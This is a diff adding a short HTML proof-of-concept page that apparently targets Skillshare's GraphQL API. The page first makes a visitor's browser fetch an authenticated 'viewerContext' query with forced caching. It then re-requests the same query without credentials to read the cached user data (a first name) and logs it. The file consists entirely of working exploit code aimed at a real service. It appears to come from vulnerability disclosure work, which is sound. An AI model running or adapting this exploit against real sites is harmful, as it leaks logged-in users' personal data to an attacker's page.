@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<!-- Step1, Caching with Auth -->
+<script>  
+var url = "https://www.skillshare.com/api/graphql?query=query+viewerContext%28%24isAuthenticated%3A+Boolean%21%29+%7B+viewer+%40include%28if%3A+%24isAuthenticated%29+%7B+firstName+%7D+%7D&variables=%7B%22isAuthenticated%22%3Atrue%7D";  
+fetch(url, {    
+    method: 'GET',    
+    cache: 'force-cache'
+    });
+</script>
+<!-- Sometimes, it is convenient to use the img tag when it is cached by default. -->
+<!-- <img src="https://www.skillshare.com/api/graphql?query=query+viewerContext%28%24isAuthenticated%3A+Boolean%21%29+%7B+viewer+%40include%28if%3A+%24isAuthenticated%29+%7B+firstName+%7D+%7D&variables=%7B%22isAuthenticated%22%3Atrue%7D"> -->
+
+<!-- Step2, Get Userdata without Auth(Using cache)-->
+<script>
+//delay for cached
+setTimeout(function (){
+  // get information without auth
+  $.ajax({
+      url: "/api/graphql?query=query+viewerContext%28%24isAuthenticated%3A+Boolean%21%29+%7B+viewer+%40include%28if%3A+%24isAuthenticated%29+%7B+firstName+%7D+%7D&variables=%7B%22isAuthenticated%22%3Atrue%7D",
+      type: "get",
+      xhrFields: {
+        withCredentials: false 
+      },
+      headers: {
+          "Accept":"application/json",
+          "Accept-Language":"ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3",
+      },
+      success: function (data) {
+          console.info(data);
+      }
+  });
+}, 2000);
+</script>
